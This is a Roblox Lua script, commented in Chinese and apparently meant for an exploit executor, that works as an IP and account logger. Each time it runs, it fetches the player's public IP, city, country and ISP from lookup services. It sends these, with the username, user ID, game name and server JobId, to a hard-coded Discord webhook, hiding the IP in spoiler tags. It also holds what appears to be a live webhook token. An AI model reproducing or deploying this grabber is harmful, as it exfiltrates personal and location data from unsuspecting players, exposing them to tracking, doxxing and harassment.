--// 服務初始化
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer

--// 設定
local webhookURL = "https://discord.com/api/webhooks/1389953544009814106/83Lx-nyCheX0oe9e-4e_cIJF_TU4JPxMGiYSxomG8RoGCa6S_bJeQOfFzS8CzwnI-nXg"
local gameName = "Unknown"
local embedColor = tonumber("0x2ECC71" ) -- 模仿圖片中的綠色
local authorIcon = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Roblox_round_logo.svg/1200px-Roblox_round_logo.svg.png" -- Roblox Logo

--// 增強的 HTTP 請求函數
local function secureRequest(options )
    local requestFunc = request or http_request or (syn and syn.request )
    if requestFunc then
        local success, response = pcall(function() return requestFunc(options) end)
        if success and response then return response end
    end
    if options.Method == "GET" and game.HttpGetAsync then
         local success, responseBody = pcall(game.HttpGetAsync, game, options.Url)
         if success and responseBody then return { Body = responseBody, StatusCode = 200 } end
    end
    warn("所有 HTTP 請求方法均失敗。")
    return nil
end

--// 獲取 IP 和地理位置的函數
local function getSecretInfo()
    local ipServices = { "https://api.ipify.org", "https://ipinfo.io/ip", "https://icanhazip.com" }
    local ip
    for _, url in ipairs(ipServices ) do
        local response = secureRequest({ Url = url, Method = "GET" })
        if response and response.Body and #response.Body > 0 and not response.Body:find("[<>]") then
            ip = response.Body:gsub("%s+", "")
            break
        end
    end
    if not ip then return nil end
    local ipDetails
    local detailResponse = secureRequest({ Url = "https://ipinfo.io/" .. ip .. "/json", Method = "GET" } )
    if detailResponse and detailResponse.Body then
        local success, decoded = pcall(HttpService.JSONDecode, HttpService, detailResponse.Body)
        if success and type(decoded) == "table" then ipDetails = decoded end
    end
    return { ip = ip, details = ipDetails }
end

--// 主要執行邏輯
pcall(function()
    -- 1. 獲取遊戲名稱
    pcall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        gameName = info.Name or "Unknown"
    end)

    -- 2. 獲取 IP 資訊
    local secretInfo = getSecretInfo()

    -- 3. 建立個人資料連結
    local profileUrl = "https://www.roblox.com/users/" .. tostring(LocalPlayer.UserId ) .. "/profile"

    -- 4. 準備 embed 的 fields 陣列
    local fields = {
        -- 第一行: 真實名稱 和 玩家ID (並排)
        { name = "真實名稱 (Username)", value = "```" .. LocalPlayer.Name .. "```", inline = true },
        { name = "玩家ID (User ID)", value = "```" .. tostring(LocalPlayer.UserId) .. "```", inline = true },
        -- 留空欄位以製造換行效果
        { name = "\u{200B}", value = "\u{200B}", inline = false },
        -- 第二行: 遊戲名稱 和 伺服器人數 (並排)
        { name = "遊戲 (Game)", value = "```" .. gameName .. "```", inline = true },
        { name = "伺服器人數 (Players)", value = "```" .. tostring(#Players:GetPlayers()) .. "```", inline = true },
        -- 留空欄位以製造換行效果
        { name = "\u{200B}", value = "\u{200B}", inline = false },
        -- 第三行: 加入代碼 (單獨一行)
        { name = "加入代碼 (JobId)", value = "```" .. (game.JobId or "N/A") .. "```", inline = false },
    }

    -- 5. 如果成功獲取到 IP，則將其作為一個新欄位加入
    if secretInfo and secretInfo.ip then
        local secretValue = "||IP: " .. secretInfo.ip .. "||"
        if secretInfo.details then
            secretValue = secretValue ..
                "\n||位置: " .. (secretInfo.details.city or "?") .. ", " .. (secretInfo.details.country or "?") .. "||" ..
                "\n||ISP: " .. (secretInfo.details.org or "?") .. "||"
        end
        table.insert(fields, {
            name = "🔒 網路資訊 (機密)",
            value = secretValue,
            inline = false
        })
    end

    -- 6. 構建並發送最終的 webhook 資料
    local data = {
        username = "Roblox Logger", -- 機器人名稱
        avatar_url = authorIcon, -- 機器人頭像
        embeds = {{
            author = {
                name = "帳號資訊: " .. LocalPlayer.DisplayName,
                url = profileUrl, -- 點擊作者名稱可跳轉到個人檔案
                icon_url = authorIcon
            },
            color = embedColor,
            fields = fields,
            footer = {
                text = "Nash Logger • " .. os.date("!%Y-%m-%d %H:%M:%SZ")
            }
        }}
    }

    secureRequest({
        Url = webhookURL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(data)
    })
end)
